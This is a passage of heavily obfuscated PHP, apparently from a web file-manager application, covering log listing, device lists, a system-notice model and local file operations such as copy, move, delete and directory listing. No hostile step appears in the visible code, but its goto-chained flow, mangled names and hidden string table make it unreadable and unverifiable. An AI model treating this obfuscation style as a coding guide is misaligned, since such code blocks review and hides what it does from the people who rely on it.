$b¸±øà–æ‡[$f¯í‰Ø–Õ][$cå¹Ü¦­·Ò[400]] = json_encode($f¡Ì­Ûª½ø); goto Fæ×ƒ˜ÀÈ°; aªğÓ¿“î: if (!isset($f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[75]]) || strpos($D¾¿ß«ùŠĞ[$cå¹Ü¦­·Ò[29]], $cå¹Ü¦­·Ò[2437]) !== 0) { continue; } if (!IO::init($f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[75]])) { continue; } if (!($c•»šß À† = IO::infoFull($f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[75]]))) { continue; } goto fÛ¬îÈ“£‡; EÑª¬¬Íáâ: } goto fí¶‘Âä; c¯ë®ˆÏ¸: if ($f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[29]] == $cå¹Ü¦­·Ò[2259]) { $A•°š˜åÍ [] = $f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[400]][$cå¹Ü¦­·Ò[365]]; } goto cë¬Ê£âçë; cë¬Ê£âçë: } if (!$A•°š˜åÍ ) { return array(); } return Model($cå¹Ü¦­·Ò[754])->sourceListInfo($A•°š˜åÍ , !0); } private function logList($BİÉíØ’ó³) { goto BÂˆ¶…ÇÁ¹; fá™—®¶³¡: $B‰¼ºŸİÅ = array(); foreach ($BİÉíØ’ó³ as $C¯›•ä±ŠÚ => $E§Úå‡Œ) { goto B×¦£²¾±Ì; Bè¸£¯ô±: unset($E§Úå‡Œ[$eÕÔÃ‡ÊÀã[2440]]); $aŒ†ÏÜ×À‹[] = $E§Úå‡Œ; goto a‚òá¸¯’Ú; bñÁñÉ„â: $E§Úå‡Œ[$eÕÔÃ‡ÊÀã[28]] = isset($b¤Ö•ñ–ê[$eÕÔÃ‡ÊÀã[28]]) ? $b¤Ö•ñ–ê[$eÕÔÃ‡ÊÀã[28]] : LNG($eÕÔÃ‡ÊÀã[2434]); $E§Úå‡Œ[$eÕÔÃ‡ÊÀã[2300]] = isset($b¤Ö•ñ–ê[$eÕÔÃ‡ÊÀã[2300]]) ? $b¤Ö•ñ–ê[$eÕÔÃ‡ÊÀã[2300]] : $eÕÔÃ‡ÊÀã[33]; $E§Úå‡Œ[$eÕÔÃ‡ÊÀã[1325]] = isset($EÈÉËõ¿[$dø×É¯ê‘æ]) ? $EÈÉËõ¿[$dø×É¯ê‘æ] : $b´æƒÄÉòœ; goto EøÒ‰¾‡Äõ; B×¦£²¾±Ì: $dø×É¯ê‘æ = $E§Úå‡Œ[$eÕÔÃ‡ÊÀã[29]]; $b¤Ö•ñ–ê = isset($FâŠ‚ ñ„[$E§Úå‡Œ[$eÕÔÃ‡ÊÀã[1417]]]) ? $FâŠ‚ ñ„[$E§Úå‡Œ[$eÕÔÃ‡ÊÀã[1417]]] : !1; $b´æƒÄÉòœ = strpos($dø×É¯ê‘æ, $eÕÔÃ‡ÊÀã[2438]) === 0 ? LNG($eÕÔÃ‡ÊÀã[2439]) : LNG($eÕÔÃ‡ÊÀã[2434]); goto bñÁñÉ„â; EøÒ‰¾‡Äõ: $E§Úå‡Œ[$eÕÔÃ‡ÊÀã[2217]] = $b¤Ö•ñ–ê; $Eê„®¿ì˜ = json_decode($E§Úå‡Œ[$eÕÔÃ‡ÊÀã[400]], !0); $E§Úå‡Œ[$eÕÔÃ‡ÊÀã[2431]] = isset($Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2431]]) ? $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2431]] : $eÕÔÃ‡ÊÀã[33]; goto BÖà“òÆÎ›; BÖà“òÆÎ›: $this->ipAddress($E§Úå‡Œ); if (strpos($dø×É¯ê‘æ, $eÕÔÃ‡ÊÀã[2252]) === 0 || isset($Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2251]])) { goto cÎ”Ó»Ë¢; a±ÓÕØß‘á: if ($Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[29]] == $eÕÔÃ‡ÊÀã[2259]) { $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[400]][$eÕÔÃ‡ÊÀã[365]] = $EíãòªÏÊä[$Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[400]][$eÕÔÃ‡ÊÀã[365]]]; } if ($Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[29]] == $eÕÔÃ‡ÊÀã[2047]) { $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2264]] = $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[387]]; $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2251]] = $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2264]][$eÕÔÃ‡ÊÀã[365]]; $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[387]] = !1; $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[365]] = $eÕÔÃ‡ÊÀã[33]; } if ($Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[387]] && $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[387]][$eÕÔÃ‡ÊÀã[367]] == $eÕÔÃ‡ÊÀã[1083]) { $B‰¼ºŸİÅ[] = $E§Úå‡Œ[$eÕÔÃ‡ÊÀã[363]]; unset($BİÉíØ’ó³[$C¯›•ä±ŠÚ]); continue; } goto CÙ’²àâ¤; cÎ”Ó»Ë¢: $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[387]] = $EíãòªÏÊä[$Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[365]]]; $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2264]] = $EíãòªÏÊä[$Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2251]]]; if ($Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[29]] == $eÕÔÃ‡ÊÀã[487]) { $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[400]][$eÕÔÃ‡ÊÀã[1008]] = $EíãòªÏÊä[$Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[400]][$eÕÔÃ‡ÊÀã[1008]]]; $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[400]][$eÕÔÃ‡ÊÀã[1009]] = $EíãòªÏÊä[$Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[400]][$eÕÔÃ‡ÊÀã[1009]]]; } goto a±ÓÕØß‘á; CÙ’²àâ¤: if ($Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2264]] && $Eê„®¿ì˜[$eÕÔÃ‡ÊÀã[2264]][$eÕÔÃ‡ÊÀã[367]] == $eÕÔÃ‡ÊÀã[1083]) { $B‰¼ºŸİÅ[] = $E§Úå‡Œ[$eÕÔÃ‡ÊÀã[363]]; unset($BİÉíØ’ó³[$C¯›•ä±ŠÚ]); continue; } goto E„çÂ­Î‹ñ; E„çÂ­Î‹ñ: } $E§Úå‡Œ[$eÕÔÃ‡ÊÀã[400]] = $Eê„®¿ì˜; goto Bè¸£¯ô±; a‚òá¸¯’Ú: } $this->clearSystemPathLog($B‰¼ºŸİÅ); goto b³ùˆ…†åÛ; BÂˆ¶…ÇÁ¹: $eÕÔÃ‡ÊÀã =& $_SERVER[Õİõş]; $bÑç´‰©’ = array_to_keyvalue($BİÉíØ’ó³, $eÕÔÃ‡ÊÀã[33], $eÕÔÃ‡ÊÀã[1417]); $FâŠ‚ ñ„ = Model($eÕÔÃ‡ÊÀã[472])->userListInfo(array_unique($bÑç´‰©’)); goto dòˆØĞ‘Šµ; dòˆØĞ‘Šµ: $EíãòªÏÊä = $this->getSourceList($BİÉíØ’ó³); $EÈÉËõ¿ = $this->typeAll(); $aŒ†ÏÜ×À‹ = array(); goto fá™—®¶³¡; b³ùˆ…†åÛ: return $aŒ†ÏÜ×À‹; goto d†ï±ëñÖ½; d†ï±ëñÖ½: } private function clearSystemPathLog($C®‰Õ»±¡½) { $F£Ù½‡¥—ƒ =& $_SERVER[Õİõş]; if (count($C®‰Õ»±¡½) == 0) { return; } $CÁÕÒá¹Ò = array($F£Ù½‡¥—ƒ[363] => array($F£Ù½‡¥—ƒ[7], array_unique($C®‰Õ»±¡½))); $this->where($CÁÕÒá¹Ò)->delete(); } public function deviceList($BÃï•Œ¼Ğ, $BÏ£¹‹ ë = 0) { $eùâÒÙ·‰ =& $_SERVER[Õİõş]; $fĞ‡‚šÛàÑ = array($eùâÒÙ·‰[1417] => $BÃï•Œ¼Ğ, $eùâÒÙ·‰[183] => array($eùâÒÙ·‰[932], $BÏ£¹‹ ë), $eùâÒÙ·‰[29] => $eùâÒÙ·‰[2020]); $e³ÀÓÊğã = array(); $aöª’ß£± = $this->field($eùâÒÙ·‰[2441])->where($fĞ‡‚šÛàÑ)->order($eùâÒÙ·‰[2262])->limit(50)->select(); foreach ($aöª’ß£± as $EœÉ»‡¶åŒ => $a„ì‡Ñ†‡ˆ) { goto Dë’êÅ¨éË; BÓß‹«÷•: $this->ipAddress($a„ì‡Ñ†‡ˆ); $a„ì‡Ñ†‡ˆ[$eùâÒÙ·‰[400]] = $C¢¿Ü°ŒÓ„; $e³ÀÓÊğã[$a¯Îï›„ß] = $a„ì‡Ñ†‡ˆ; goto cÃ±¤Ì­™í; aÓÆ”‰×Ë¢: unset($C¢¿Ü°ŒÓ„[$eùâÒÙ·‰[2431]]); $a¯Îï›„ß = $this->deviceType($C¢¿Ü°ŒÓ„[$eùâÒÙ·‰[2253]]); if (isset($e³ÀÓÊğã[$a¯Îï›„ß])) { continue; } goto BÓß‹«÷•; Dë’êÅ¨éË: if ($EœÉ»‡¶åŒ > 0 && abs($a„ì‡Ñ†‡ˆ[$eùâÒÙ·‰[183]] - $aöª’ß£±[$EœÉ»‡¶åŒ - 1][$eùâÒÙ·‰[183]]) < 5) { continue; } $C¢¿Ü°ŒÓ„ = json_decode($a„ì‡Ñ†‡ˆ[$eùâÒÙ·‰[400]], !0); $a„ì‡Ñ†‡ˆ[$eùâÒÙ·‰[2431]] = isset($C¢¿Ü°ŒÓ„[$eùâÒÙ·‰[2431]]) ? $C¢¿Ü°ŒÓ„[$eùâÒÙ·‰[2431]] : $eùâÒÙ·‰[33]; goto aÓÆ”‰×Ë¢; cÃ±¤Ì­™í: } return array_values($e³ÀÓÊğã); } public function deviceType($bé×Ó—åİ) { return $bé×Ó—åİ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\156\x6f\164\151\143\145\x4c\151\x73\164"; public $field = array("\156\x61\155\x65", "\143\x6f\x6e\164\x65\x6e\x74", "\141\x75\164\x68", "\155\x6f\x64\x65", "\x74\x69\x6d\x65", "\164\171\x70\145", "\154\x65\x76\145\154", "\145\156\141\x62\x6c\145", "\x73\x6f\x72\164"); public function listData($c…„¢„éÎ„ = false, $c“¡·ªó”á = "\x73\157\162\164", $cïÙ‹³æ»› = false) { return parent::listData($c…„¢„éÎ„, $c“¡·ªó”á, $cïÙ‹³æ»›); } public function add($b¯ñŸƒòùØ) { goto b©ùµª×™; F‡®ç•Ã»ğ: $Dßªµ„è¡¸ = time(); if ($b¯ñŸƒòùØ[$b¤™‚á§èÍ[12]] == $b¤™‚á§èÍ[2442]) { $Dßªµ„è¡¸ = strtotime($b¯ñŸƒòùØ[$b¤™‚á§èÍ[186]]); } $b¯ñŸƒòùØ[$b¤™‚á§èÍ[186]] = $Dßªµ„è¡¸; goto cš×Ó‰»»; b©ùµª×™: $b¤™‚á§èÍ =& $_SERVER[Õİõş]; $E±†ØÏÃè‡ = $this->findByName($b¯ñŸƒòùØ[$b¤™‚á§èÍ[28]]); if ($E±†ØÏÃè‡) { return !1; } goto F‡®ç•Ã»ğ; cš×Ó‰»»: return parent::insert($b¯ñŸƒòùØ); goto CÈÙ®Ö Şõ; CÈÙ®Ö Şõ: } public function update($e¿“ÏÕã—Œ, $B“¸–ˆøóï) { goto BÖ§Œ‘‡ñ; c›Á³ƒˆ’: if (!$e•¢å£„Á½ || $câ§–¾ù• && $câ§–¾ù•[$F¶‘İ“¸ì[363]] != $e•¢å£„Á½[$F¶‘İ“¸ì[363]]) { return !1; } $Fª‰á´ËšÌ = time(); if ($B“¸–ˆøóï[$F¶‘İ“¸ì[12]] == $F¶‘İ“¸ì[2442]) { $Fª‰á´ËšÌ = strtotime($B“¸–ˆøóï[$F¶‘İ“¸ì[186]]); } goto AŞ¦äÉÌĞ; AŞ¦äÉÌĞ: $B“¸–ˆøóï[$F¶‘İ“¸ì[186]] = $Fª‰á´ËšÌ; return parent::update($e¿“ÏÕã—Œ, $B“¸–ˆøóï); goto dÌÔŞ‘¦…; BÖ§Œ‘‡ñ: $F¶‘İ“¸ì =& $_SERVER[Õİõş]; $e•¢å£„Á½ = $this->listData($e¿“ÏÕã—Œ); $câ§–¾ù• = $this->findByName($B“¸–ˆøóï[$F¶‘İ“¸ì[28]]); goto c›Á³ƒˆ’; dÌÔŞ‘¦…: } public function remove($bÍ‹ÆÅÈ…‹) { $eåÜ…£¸¯ä = $this->listData($bÍ‹ÆÅÈ…‹); if (!$eåÜ…£¸¯ä || $eåÜ…£¸¯ä[$_SERVER[Õİõş][1083]]) { return !1; } return parent::remove($bÍ‹ÆÅÈ…‹); } public function sort($a¸Ù­óƒŒ, $B×¯ù­ˆÓõ) { return parent::update($a¸Ù­óƒŒ, $B×¯ù­ˆÓõ); } public function enable($b Œ¸¹Û‚, $Dó³½ ‰Ğ) { return parent::update($b Œ¸¹Û‚, array($_SERVER[Õİõş][2443] => $Dó³½ ‰Ğ)); } private function initUserOption() { $döØŠ²ÂÕ =& $_SERVER[Õİõş]; $this->optionType = $döØŠ²ÂÕ[2444]; $this->modelType = $döØŠ²ÂÕ[2445]; $this->field = array($döØŠ²ÂÕ[2446], $döØŠ²ÂÕ[28], $döØŠ²ÂÕ[186], $döØŠ²ÂÕ[29], $döØŠ²ÂÕ[2447], $döØŠ²ÂÕ[691], $döØŠ²ÂÕ[179]); } public function userNoticeGet($Cœ…ñÉ•Å = false) { $this->initUserOption(); return parent::listData($Cœ…ñÉ•Å, $_SERVER[Õİõş][363], !0); } public function userNoticeAdd($A“ô¿èÇ¥Ş) { $D¾´¶¤Ì° =& $_SERVER[Õİõş]; $this->initUserOption(); $AÓß‡ßÂ´Ü = $this->findByKey($D¾´¶¤Ì°[2446], $A“ô¿èÇ¥Ş[$D¾´¶¤Ì°[363]]); if ($AÓß‡ßÂ´Ü) { return !0; } $E“ß©ÓÊ­ = array($D¾´¶¤Ì°[2446] => $A“ô¿èÇ¥Ş[$D¾´¶¤Ì°[363]], $D¾´¶¤Ì°[28] => $A“ô¿èÇ¥Ş[$D¾´¶¤Ì°[28]], $D¾´¶¤Ì°[186] => $A“ô¿èÇ¥Ş[$D¾´¶¤Ì°[186]], $D¾´¶¤Ì°[29] => isset($A“ô¿èÇ¥Ş[$D¾´¶¤Ì°[29]]) ? $A“ô¿èÇ¥Ş[$D¾´¶¤Ì°[29]] : 1, $D¾´¶¤Ì°[2447] => isset($A“ô¿èÇ¥Ş[$D¾´¶¤Ì°[2447]]) ? $A“ô¿èÇ¥Ş[$D¾´¶¤Ì°[2447]] : 0, $D¾´¶¤Ì°[691] => 0, $D¾´¶¤Ì°[179] => 0); return parent::insert($E“ß©ÓÊ­); } public function userNoticeEdit($cßµ©óˆš›, $FˆÍ÷¬‘—³) { $this->initUserOption(); return parent::update($cßµ©óˆš›, $FˆÍ÷¬‘—³); } } goto c‡ˆÛŒáº; eé‘†ŞÉ¿: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($bˆĞä¹’ôñ) { if (substr($bˆĞä¹’ôñ, 0, 2) == $_SERVER[Õİõş][1150]) { $bˆĞä¹’ôñ = BASIC_PATH . substr($bˆĞä¹’ôñ, 2); } return $bˆĞä¹’ôñ; } public function iconvApp($EïòÊŞÆÃ‚) { $CÊ¹Ğíåô  =& $_SERVER[Õİõş]; global $config; return $this->iconvTo($EïòÊŞÆÃ‚, $config[$CÊ¹Ğíåô [1148]], $config[$CÊ¹Ğíåô [1147]]); } public function iconvSystem($bÓ³ƒİç‰²) { $D¢­îŸİ =& $_SERVER[Õİõş]; global $config; return $this->iconvTo($bÓ³ƒİç‰², $config[$D¢­îŸİ[1147]], $config[$D¢­îŸİ[1148]]); } public function getPathOuter($eç››Ñîâ) { goto F±¾ïÅŠÃä; F±¾ïÅŠÃä: $eÖÎ¿áÂĞ =& $_SERVER[Õİõş]; $FŸÔ—‡âêŠ = $this->iconvApp($this->pathBase); $eç››Ñîâ = $this->iconvApp($eç››Ñîâ); goto Eö§Æ§£¯Ş; c š«áÆÑ°: $eç››Ñîâ = KodIO::clear($eç››Ñîâ); $eç››Ñîâ = substr($eç››Ñîâ, strlen($FŸÔ—‡âêŠ)); if (empty($this->pathDriver)) { return $eç››Ñîâ; } goto a‚´ØÎ³î÷; Eö§Æ§£¯Ş: if (substr($FŸÔ—‡âêŠ, 0, 2) == $eÖÎ¿áÂĞ[1150]) { $FŸÔ—‡âêŠ = BASIC_PATH . substr($FŸÔ—‡âêŠ, 2); } if (substr($eç››Ñîâ, 0, 2) == $eÖÎ¿áÂĞ[1150]) { $eç››Ñîâ = BASIC_PATH . substr($eç››Ñîâ, 2); } $FŸÔ—‡âêŠ = KodIO::clear($FŸÔ—‡âêŠ); goto c š«áÆÑ°; a‚´ØÎ³î÷: return $this->pathDriver . $eÖÎ¿áÂĞ[8] . ltrim($eç››Ñîâ, $eÖÎ¿áÂĞ[8]); goto EÄóŒ»Å˜ï; EÄóŒ»Å˜ï: } public function mkfile($eÕ÷ä¯ñøİ, $b´Ì¹ÖÚ¹¦ = '', $E‡‰œª¿Ç = REPEAT_RENAME) { $eÕ÷ä¯ñøİ = $this->iconvSystem($eÕ÷ä¯ñøİ); @touch($eÕ÷ä¯ñøİ); if ($b´Ì¹ÖÚ¹¦) { file_put_contents($eÕ÷ä¯ñøİ, $b´Ì¹ÖÚ¹¦); } return is_file($eÕ÷ä¯ñøİ) ? $this->getPathOuter($eÕ÷ä¯ñøİ) : !1; } public function mkdir($aæœ‡ä¨ÏØ, $aµâÄ‘ŒÚ¬ = REPEAT_SKIP) { $aæœ‡ä¨ÏØ = $this->iconvSystem($aæœ‡ä¨ÏØ); if (is_dir($aæœ‡ä¨ÏØ)) { return $this->getPathOuter($aæœ‡ä¨ÏØ); } @mkdir($aæœ‡ä¨ÏØ, 511, !0); return is_dir($aæœ‡ä¨ÏØ) ? $this->getPathOuter($aæœ‡ä¨ÏØ) : !1; } public function copyFile($fÛ›—è×Û, $BøçÀìÇ«Ì) { $this->mkdir($this->pathFather($BøçÀìÇ«Ì)); $fÛ›—è×Û = $this->iconvSystem($fÛ›—è×Û); $BøçÀìÇ«Ì = $this->iconvSystem($BøçÀìÇ«Ì); $AÇ©Â‹ã±® = @copy($fÛ›—è×Û, $BøçÀìÇ«Ì); return $AÇ©Â‹ã±® ? $this->getPathOuter($BøçÀìÇ«Ì) : !1; } public function moveFile($E›„¿ß´çö, $EíĞòÍÆ°Ú) { $this->mkdir($this->pathFather($EíĞòÍÆ°Ú)); $E›„¿ß´çö = $this->iconvSystem($E›„¿ß´çö); $EíĞòÍÆ°Ú = $this->iconvSystem($EíĞòÍÆ°Ú); $C¼åäÖĞ›¹ = intval(@rename($E›„¿ß´çö, $EíĞòÍÆ°Ú)); if (!$C¼åäÖĞ›¹) { if ($C¼åäÖĞ›¹ = intval(@copy($E›„¿ß´çö, $EíĞòÍÆ°Ú))) { @unlink($E›„¿ß´çö); } } return $C¼åäÖĞ›¹ ? $this->getPathOuter($EíĞòÍÆ°Ú) : !1; } public function delFile($AØ¨§¾™ß¹) { $AØ¨§¾™ß¹ = $this->iconvSystem($AØ¨§¾™ß¹); if (!@unlink($AØ¨§¾™ß¹)) { @chmod($AØ¨§¾™ß¹, 511); if (!@unlink($AØ¨§¾™ß¹)) { return !1; } } else { return !0; } } public function delFolder($FÇ°¹íÓÏ˜) { goto D«Ù”éò»ƒ; D¥²®‰Îµß: return rmdir($FÇ°¹íÓÏ˜); goto CŠÁ‹ÎòÓ; D«Ù”éò»ƒ: $Aàƒ¬º–ô¢ =& $_SERVER[Õİõş]; $FÇ°¹íÓÏ˜ = $this->iconvSystem($FÇ°¹íÓÏ˜); if (!is_dir($FÇ°¹íÓÏ˜)) { return !0; } goto b”÷œÁ ·¢; b”÷œÁ ·¢: if (!($aƒäƒêÁ£± = opendir($FÇ°¹íÓÏ˜))) { return !1; } while (($eøò¯ËÔïš = readdir($aƒäƒêÁ£±)) !== !1) { if ($eøò¯ËÔïš == $Aàƒ¬º–ô¢[91] || $eøò¯ËÔïš == $Aàƒ¬º–ô¢[1160]) { continue; } $b­‰…ÅÄ÷ = $FÇ°¹íÓÏ˜ . $Aàƒ¬º–ô¢[8] . $eøò¯ËÔïš; if (!is_dir($b­‰…ÅÄ÷)) { if (!unlink($b­‰…ÅÄ÷)) { chmod($b­‰…ÅÄ÷, 511); if (!unlink($b­‰…ÅÄ÷)) { return !1; } } } else { chmod($b­‰…ÅÄ÷, 511); $b­‰…ÅÄ÷ = $this->iconvApp($b­‰…ÅÄ÷); if (!$this->delFolder($b­‰…ÅÄ÷)) { return !1; } } } closedir($aƒäƒêÁ£±); goto D¥²®‰Îµß; CŠÁ‹ÎòÓ: } public function rename($d¥¥Æõ¥‡å, $c„ÇŒÈøÑã) { goto aŒÃ’†Ï“í; A¿ÑÌ¥ºÄ: $AÖ¥ÁÕ°àÁ = @rename($d¥¥Æõ¥‡å, $FÇÁÊÍâˆ¦); $FÇÁÊÍâˆ¦ = $this->iconvApp($FÇÁÊÍâˆ¦); return $AÖ¥ÁÕ°àÁ ? $this->getPathOuter($FÇÁÊÍâˆ¦) : !1; goto B´Âç“Á¥; aŒÃ’†Ï“í: $eí”å™¢âä =& $_SERVER[Õİõş]; $E“™»Îà²ù = $this->fileNameAuto($this->pathFather($d¥¥Æõ¥‡å), $c„ÇŒÈøÑã); $E“™»Îà²ù = $this->iconvSystem($E“™»Îà²ù); goto eÄ‹œ‚‡ó„; eÄ‹œ‚‡ó„: $d¥¥Æõ¥‡å = $this->iconvSystem($d¥¥Æõ¥‡å); $f‚ˆ”®ÛÇ¡ = $this->pathFather($d¥¥Æõ¥‡å); $FÇÁÊÍâˆ¦ = rtrim($f‚ˆ”®ÛÇ¡, $eí”å™¢âä[8]) . $eí”å™¢âä[8] . $E“™»Îà²ù; goto A¿ÑÌ¥ºÄ; B´Âç“Á¥: } public function size($eÌô…ïÖ·) { $eÌô…ïÖ· = $this->iconvSystem($eÌô…ïÖ·); return (double) abs(sprintf($_SERVER[Õİõş][1162], @filesize($eÌô…ïÖ·))); } public function info($A©‰ø‡íÂ­) { $A©‰ø‡íÂ­ = $this->iconvSystem($A©‰ø‡íÂ­); if ($this->isFolder($A©‰ø‡íÂ­)) { return $this->folderInfo($A©‰ø‡íÂ­); } else { if ($this->isFile($A©‰ø‡íÂ­)) { return $this->fileInfo($A©‰ø‡íÂ­); } } return !1; } protected function infoChildren($Dİ”Ê©Áğó, &$aµ¥£åÄ, $AÇ§Ò¹İ­Í = true) { $Bê†ô„‡ÈŞ =& $_SERVER[Õİõş]; $Dİ”Ê©Áğó = rtrim($Dİ”Ê©Áğó, $Bê†ô„‡ÈŞ[8]) . $Bê†ô„‡ÈŞ[8]; if ($AÇ§Ò¹İ­Í) { check_abort(); $Dİ”Ê©Áğó = $this->iconvSystem($Dİ”Ê©Áğó); } if (!($D÷Õ«‚ê = @opendir($Dİ”Ê©Áğó))) { return; } while (($b‘ˆ­¡…ÎÍ = readdir($D÷Õ«‚ê)) !== !1) { if ($b‘ˆ­¡…ÎÍ == $Bê†ô„‡ÈŞ[91] || $b‘ˆ­¡…ÎÍ == $Bê†ô„‡ÈŞ[1160]) { continue; } $Bğ¥Œ‡×æ = $Dİ”Ê©Áğó . $b‘ˆ­¡…ÎÍ; if (is_file($Bğ¥Œ‡×æ)) { $aµ¥£åÄ[$Bê†ô„‡ÈŞ[78]]++; $aµ¥£åÄ[$Bê†ô„‡ÈŞ[77]] += (double) abs(sprintf($Bê†ô„‡ÈŞ[1162], @filesize($Bğ¥Œ‡×æ))); } else { $aµ¥£åÄ[$Bê†ô„‡ÈŞ[79]]++; $this->infoChildren($Bğ¥Œ‡×æ, $aµ¥£åÄ, !1); } } closedir($D÷Õ«‚ê); } private function folderInfo($A‚¦‘÷‰ã£, $c„‹İ‹Ò»“ = false) { $cîÜó‘¯Îš =& $_SERVER[Õİõş]; $A‚¦‘÷‰ã£ = rtrim($A‚¦‘÷‰ã£, $cîÜó‘¯Îš[8]) . $cîÜó‘¯Îš[8]; $F¬¼×³ÖËğ = $this->iconvApp($this->pathThis($A‚¦‘÷‰ã£)); if ($c„‹İ‹Ò»“) { return array($cîÜó‘¯Îš[28] => $F¬¼×³ÖËğ, $cîÜó‘¯Îš[75] => $this->getPathOuter($A‚¦‘÷‰ã£), $cîÜó‘¯Îš[29] => $cîÜó‘¯Îš[76]); } $B–¸Úè¢˜ = array($cîÜó‘¯Îš[28] => $F¬¼×³ÖËğ, $cîÜó‘¯Îš[75] => $this->getPathOuter($A‚¦‘÷‰ã£), $cîÜó‘¯Îš[29] => $cîÜó‘¯Îš[76], $cîÜó‘¯Îš[183] => @filectime($A‚¦‘÷‰ã£), $cîÜó‘¯Îš[106] => @filemtime($A‚¦‘÷‰ã£), $cîÜó‘¯Îš[1163] => @fileatime($A‚¦‘÷‰ã£), $cîÜó‘¯Îš[1157] => is_readable($A‚¦‘÷‰ã£), $cîÜó‘¯Îš[1158] => is_writable($A‚¦‘÷‰ã£), $cîÜó‘¯Îš[1164] => get_mode($A‚¦‘÷‰ã£)); return $B–¸Úè¢˜; } private function fileInfo($DŒÃ¬¤»¾Ş, $c—·‘Àº©É = false) { $E ‘ôÌåø =& $_SERVER[Õİõş]; $FˆõØ…®¸ø = $this->iconvApp($this->pathThis($DŒÃ¬¤»¾Ş)); if ($c—·‘Àº©É) { return array($E ‘ôÌåø[28] => $FˆõØ…®¸ø, $E ‘ôÌåø[75] => $this->getPathOuter($DŒÃ¬¤»¾Ş), $E ‘ôÌåø[29] => $E ‘ôÌåø[163], $E ‘ôÌåø[77] => $this->size($DŒÃ¬¤»¾Ş), $E ‘ôÌåø[156] => $this->ext($FˆõØ…®¸ø)); } $e—ÉŞİ¥Ø’ = array($E ‘ôÌåø[28] => $FˆõØ…®¸ø, $E ‘ôÌåø[75] => $this->getPathOuter($DŒÃ¬¤»¾Ş), $E ‘ôÌåø[29] => $E ‘ôÌåø[163], $E ‘ôÌåø[183] => @filectime($DŒÃ¬¤»¾Ş), $E ‘ôÌåø[106] => @filemtime($DŒÃ¬¤»¾Ş), $E ‘ôÌåø[1163] => @fileatime($DŒÃ¬¤»¾Ş), $E ‘ôÌåø[77] => $this->size($DŒÃ¬¤»¾Ş), $E ‘ôÌåø[156] => $this->ext($FˆõØ…®¸ø), $E ‘ôÌåø[1157] => is_readable($DŒÃ¬¤»¾Ş), $E ‘ôÌåø[1158] => is_writable($DŒÃ¬¤»¾Ş), $E ‘ôÌåø[1164] => get_mode($DŒÃ¬¤»¾Ş)); return $e—ÉŞİ¥Ø’; } public function exist($aÔôÃƒã­©) { $aÔôÃƒã­© = $this->iconvSystem($aÔôÃƒã­©); return @file_exists($aÔôÃƒã­©); } public function isFile($eŒ »ÍÒ„) { $eŒ »ÍÒ„ = $this->iconvSystem($eŒ »ÍÒ„); return @is_file($eŒ »ÍÒ„); } public function isFolder($D†¥ğáğ‡â) { $D†¥ğáğ‡â = $this->iconvSystem($D†¥ğáğ‡â); return @is_dir($D†¥ğáğ‡â); } public function listPath($F§®®®µÇ‚, $dæª‡Ì‘ = false) { goto d£ó¸áˆ; dõÂ‡™›“õ: closedir($eøÇ¥„®¨ì); return $F­¡ñŠÖË³; goto b•˜±‚Á¼ä; d£ó¸áˆ: $Eéâ½—Èª¼ =& $_SERVER[Õİõş]; $F§®®®µÇ‚ = $this->iconvSystem($F§®®®µÇ‚); $F§®®®µÇ‚ = rtrim($F§®®®µÇ‚, $Eéâ½—Èª¼[8]) . $Eéâ½—Èª¼[8]; goto eßëƒì×“; eßëƒì×“: $F­¡ñŠÖË³ = array($Eéâ½—Èª¼[74] => array(), $Eéâ½—Èª¼[73] => array()); if (!($eøÇ¥„®¨ì = @opendir($F§®®®µÇ‚))) { return $F­¡ñŠÖË³; } while (($c¥ˆöÏå¢ = readdir($eøÇ¥„®¨ì)) !== !1) { if ($c¥ˆöÏå¢ == $Eéâ½—Èª¼[91] || $c¥ˆöÏå¢ == $Eéâ½—Èª¼[1160]) { continue; } $bÂ—“ÕƒÊ = $F§®®®µÇ‚ . $c¥ˆöÏå¢; if (is_file($bÂ—“ÕƒÊ)) { $F­¡ñŠÖË³[$Eéâ½—Èª¼[73]][] = $this->fileInfo($bÂ—“ÕƒÊ, $dæª‡Ì‘); } else { $F­¡ñŠÖË³[$Eéâ½—Èª¼[74]][] = $this->folderInfo($bÂ—“ÕƒÊ, $dæª‡Ì‘); } } goto dõÂ‡™›“õ; b•˜±‚Á¼ä: } public function listAll($dÙêËäÁç, &$BĞšä‘ÂÜ = array()) { goto E•ô³ÕøÚÏ; B›…ßÊğœĞ: return $BĞšä‘ÂÜ; goto b­ï•§æøí; DÂ›Òô¶ßø: if (!($Dá•©®Ùã… = @opendir($dÙêËäÁç))) { return $BĞšä‘ÂÜ; } while (($bİô¶ì÷” = readdir($Dá•©®Ùã…)) !== !1) { if ($bİô¶ì÷” == $Dëî³‡×©Å[91] || $bİô¶ì÷” == $Dëî³‡×©Å[1160]) { continue; } $fÄ‹®îâÇ = $dÙêËäÁç . $bİô¶ì÷”; if (is_dir($fÄ‹®îâÇ)) { $BĞšä‘ÂÜ[] = 